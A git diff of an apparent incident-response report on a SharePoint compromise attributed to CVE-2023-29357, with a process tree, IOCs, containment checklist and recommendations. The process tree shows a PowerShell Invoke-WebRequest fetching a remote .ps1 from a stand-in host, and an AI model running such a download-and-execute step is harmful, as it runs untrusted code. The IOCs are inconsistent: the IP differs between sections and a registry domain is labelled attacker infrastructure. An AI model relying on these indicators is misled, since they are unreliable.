@@ -59,90 +59,89 @@ No lateral movement was observed.
 **Process Tree**
 ```plaintext
 explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1
+File Hashes:
 
+SHA256: none
 
-```
-**File Hashes:**  
-- SHA256: `none`  
-- MD5 (optional): `none`
+MD5: none
 
-**Network Indicators:**  
-- Outbound connection to `<39.91.166.22:443>`  
-- Domain: `<apnic.net>`
+Network Indicators:
 
-**Host Artifacts:**  
-- Persistence: `<none>`  
-- Notable events: not enough information given
-- Screenshots / excerpts linked in Appendices
+Outbound connection to <39.91.166.22:443>
 
-**MITRE ATT&CK:**  
-- T1190 – Exploit Pubic-Facing Application  
-- T1068 – Exploitation for Privilege Escalation  
+Domain: <apnic.net>
 
----
+Host Artifacts:
 
-## 5) Containment & Eradication (Checked = Completed)
-- [X] Isolated affected host  
-- [X] Elevated to Tier 2
-- [ ] Quarantined payload / deleted artifacts  
-- [ ] Revoked creds / invalidated tokens  
-- [ ] Blocked IPs/domains/signatures across controls  
-- [ ] Removed persistence mechanisms  
-- [ ] Closed attacker sessions
+Persistence: <none>
 
----
+Notable events: not enough information given
 
-## 6) Recovery & Verification
-- [ ] Restored network access after validation  
-- [ ] Full AV/EDR scan clean  
-- [ ] Patched vulnerable components  
-- [ ] Monitored for reoccurrence for **X** hours/days
+Screenshots / excerpts linked in Appendices
 
----
+MITRE ATT&CK:
 
-## 7) Root Cause
-> _Explain the initiating action / vector. Add supporting evidence._  
-> Example: User executed a phishing attachment (`invoice.docm`) that downloaded and executed a PowerShell stager.
+T1190 – Exploit Public-Facing Application
 
----
+T1068 – Exploitation for Privilege Escalation
 
-## 8) Recommendations
-- Update and Patch Server according to Vendors Specifications  
-- Delete any new users that were added if any
-- SIEM/EDR tuning for suspicious command-line patterns  
-- URL/IP filtering for high-risk categories  
-- MFA/Conditional Access review (where relevant)
+5) Containment & Eradication (Checked = Completed)
+ Isolated affected host
 
----
+ Elevated to Tier 2
 
-## 9) Indicators of Compromise (IOCs)
-| Type      | Value                  | Description       |
-|-----------|------------------------|-------------------|
-| IP        | 39.91.166.222          | Suspected C2      |
-| File Hash | `none`                 | Malicious payload |
-| URL       | `http://www.apnic.net` | Download location |
-| Domain    | `apnic.net`            | Attacker infra    |
+ Quarantined payload / deleted artifacts
 
+ Revoked creds / invalidated tokens
 
----
+ Blocked IPs/domains/signatures across controls
 
-## 10) Appendices (Evidence)
-- Screenshots of alert console  
-- Sysmon/Windows Event excerpts  
-- PowerShell transcripts  
-- VirusTotal / sandbox results  
-- Packet captures (if applicable)
+ Removed persistence mechanisms
 
----
+ Closed attacker sessions
 
-<!-- Minimal in-page styles to match the site's aesthetic -->
-<style>
-  table { border-collapse: collapse; width: 100%; }
-  th, td { border: 1px solid #e3e8f5; padding: 8px 10px; }
-  thead th { background: #0b1220; color: #e8eefc; }
-  code { background:#0f172a; color:#e2e8f0; padding:2px 6px; border-radius:6px; }
-  pre code { display:block; padding:12px 14px; }
-  h1, h2, h3 { scroll-margin-top: 84px; }
-  hr { border:0; border-top:1px solid #e3e8f5; margin: 24px 0; }
-  .btn { display:inline-block;padding:10px 14px;border-radius:10px;border:1px solid #dbe4ff;text-decoration:none; }
-</style>
+6) Recovery & Verification
+ Restored network access after validation
+
+ Full AV/EDR scan clean
+
+ Patched vulnerable components
+
+ Monitored for reoccurrence for X hours/days
+
+7) Root Cause
+The attacker exploited an unpatched instance of Microsoft SharePoint via CVE-2023-29357, enabling elevation of privilege and execution of unauthorized PowerShell commands via the web service context.
+This vulnerability allowed the attacker to forge authentication tokens and escalate privileges without valid credentials.
+
+8) Recommendations
+Patch SharePoint Server to remediate CVE-2023-29357
+
+Review SharePoint service accounts and remove any unauthorized additions
+
+Enable auditing on SharePoint API calls & authentication mechanisms
+
+Tune SIEM/EDR detection for unusual PowerShell & token-related events
+
+Enforce MFA for SharePoint administrative functions
+
+Validate no persistence (scheduled tasks, web shells, ASHX backdoors)
+
+9) Indicators of Compromise (IOCs)
+Type	Value	Description
+IP	39.91.166.222	Suspected C2
+File Hash	none	Malicious payload
+URL	http://www.apnic.net	Download location
+Domain	apnic.net	Attacker infra
+
+10) Appendices (Evidence)
+Screenshots of alert console
+
+Sysmon/Windows Event excerpts
+
+PowerShell transcripts
+
+VirusTotal / sandbox results
+
+Packet captures (if applicable)
+
+<!-- Minimal in-page styles to match the site's aesthetic --> <style> table { border-collapse: collapse; width: 100%; } th, td { border: 1px solid #e3e8f5; padding: 8px 10px; } thead th { background: #0b1220; color: #e8eefc; } code { background:#0f172a; color:#e2e8f0; padding:2px 6px; border-radius:6px; } pre code { display:block; padding:12px 14px; } h1, h2, h3 { scroll-margin-top: 84px; } hr { border:0; border-top:1px solid #e3e8f5; margin: 24px 0; } .btn { display:inline-block;padding:10px 14px;border-radius:10px;border:1px solid #dbe4ff;text-decoration:none; } </style>
